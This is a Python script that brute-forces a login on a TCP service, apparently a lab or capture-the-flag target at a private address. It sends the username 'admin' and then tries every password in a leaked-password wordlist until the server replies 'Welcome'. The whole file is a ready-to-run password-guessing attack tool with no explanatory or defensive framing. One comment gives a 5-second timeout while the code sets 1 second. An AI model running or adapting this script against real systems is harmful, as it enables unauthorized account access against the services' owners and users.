import socket

# Configuration
target_ip = "10.10.154.18"  # Target IP
target_port = 8000          # Target port
password_wordlist = "/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-75.txt"  # Path to your password wordlist file

def connect_and_send_password(password):
    try:
        # Create a socket object and set a timeout
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(1)  # 5 seconds timeout for each connection attempt
        
        # Attempt to connect to the target
        client_socket.connect((target_ip, target_port))
        
        # Send the 'admin' username (assuming it's part of the authentication process)
        client_socket.sendall(b'admin\n')
        
        # Wait for the server to ask for the password
        response = client_socket.recv(1024).decode()

        if "Password:" in response:
            print(f"Trying password: {password}")
            # Send the current password from the wordlist
            client_socket.sendall(password.encode() + b"\n")

            # Receive the server's response
            response = client_socket.recv(1024).decode()

            # If there is a response, check if it indicates success
            if response:
                print(f"Server response for password '{password}': {response}")
                if "Welcome" in response:  # Example of successful login
                    return True
            else:
                print(f"Password '{password}' is incorrect or no response.")
        
        return False

    except socket.timeout:
        print("Connection timed out.")
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

    finally:
        # Ensure the socket is closed after each attempt
        client_socket.close()

def fuzz_passwords():
    with open(password_wordlist, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # Remove any newline characters

        if connect_and_send_password(password):
            print(f"Correct password found: {password}")
            break
        else:
            print(f"Password {password} was incorrect. Reconnecting...")

if __name__ == "__main__":
    fuzz_passwords()
